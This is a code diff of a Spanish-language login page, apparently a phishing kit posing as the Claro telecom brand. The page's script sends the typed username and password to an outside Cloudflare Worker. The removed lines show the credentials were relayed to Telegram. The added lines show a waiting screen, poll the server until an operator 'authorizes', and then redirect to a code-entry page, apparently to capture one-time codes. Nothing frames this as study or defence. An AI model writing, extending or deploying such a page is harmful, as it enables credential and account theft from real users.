@@ -5,35 +5,71 @@
   <title>Login</title>
 </head>
 <body>
-  <h2>Formulario de Acceso</h2>
-  <form id="loginForm">
-    <label>Usuario:</label>
-    <input type="text" id="usuario" required><br><br>
+  <div id="loginDiv">
+    <h2>Formulario de Acceso</h2>
+    <form id="loginForm">
+      <label>Usuario:</label>
+      <input type="text" id="usuario" required><br><br>
 
-    <label>Clave:</label>
-    <input type="password" id="clave" required><br><br>
+      <label>Clave:</label>
+      <input type="password" id="clave" required><br><br>
 
-    <button type="submit">Enviar</button>
-  </form>
+      <button type="submit">Enviar</button>
+    </form>
+  </div>
+
+  <div id="waitingDiv" style="display:none;">
+    <h2>Ingresando...</h2>
+    <p id="status">Esperando autorización...</p>
+  </div>
 
   <script>
-    document.getElementById("loginForm").addEventListener("submit", async (e) => {
+    const loginForm = document.getElementById("loginForm");
+    const loginDiv = document.getElementById("loginDiv");
+    const waitingDiv = document.getElementById("waitingDiv");
+    const statusEl = document.getElementById("status");
+
+    loginForm.addEventListener("submit", async (e) => {
       e.preventDefault();
-      
       const usuario = document.getElementById("usuario").value;
       const clave = document.getElementById("clave").value;
 
-      // URL de tu Worker en Cloudflare
-      const url = "https://blue-night-7897.claropromoxlaro.workers.dev";
+      // Enviar datos al Worker
+      try {
+        const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ usuario, clave })
+        });
 
-      const res = await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ usuario, clave })
-      });
+        const data = await res.json();
+        if(data.ok){
+          // Ocultar login, mostrar pantalla de espera
+          loginDiv.style.display = "none";
+          waitingDiv.style.display = "block";
 
-      const data = await res.json();
-      alert(data.ok ? "✅ Enviado a Telegram" : "❌ Error: " + data.error);
+          // Inicia polling
+          setInterval(async () => {
+            try {
+              const statusRes = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/status");
+              const statusData = await statusRes.json();
+              if(statusData.autorizado){
+                window.location.href = "codigo.html"; // redirige cuando autorices
+              } else {
+                statusEl.textContent = "Esperando autorización...";
+              }
+            } catch(err){
+              statusEl.textContent = "Error al conectar al servidor.";
+              console.error(err);
+            }
+          }, 3000);
+        } else {
+          alert("Error al enviar datos: " + data.error);
+        }
+      } catch(err) {
+        alert("Error al conectar con el servidor.");
+        console.error(err);
+      }
     });
   </script>
 </body>
